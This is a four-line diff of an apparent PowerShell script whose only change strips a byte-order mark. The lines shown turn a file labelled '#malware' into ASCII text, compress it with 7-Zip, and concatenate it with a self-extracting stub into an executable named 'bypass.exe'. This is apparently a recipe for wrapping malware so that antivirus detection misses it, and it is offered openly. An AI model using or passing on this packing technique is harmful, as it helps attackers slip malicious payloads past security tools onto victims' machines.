@@ -1,4 +1,4 @@
-﻿[String]::Join(' ', [IO.File]::ReadAllBytes(#malware)) | Out-File -enc ASCII raw
+[String]::Join(' ', [IO.File]::ReadAllBytes(#malware)) | Out-File -enc ASCII raw
 &7za a -mx9 raw.zip raw
 &cmd copy /b raw.zip + ZipSFX + ReverseActions bypass.exe
 #optional:
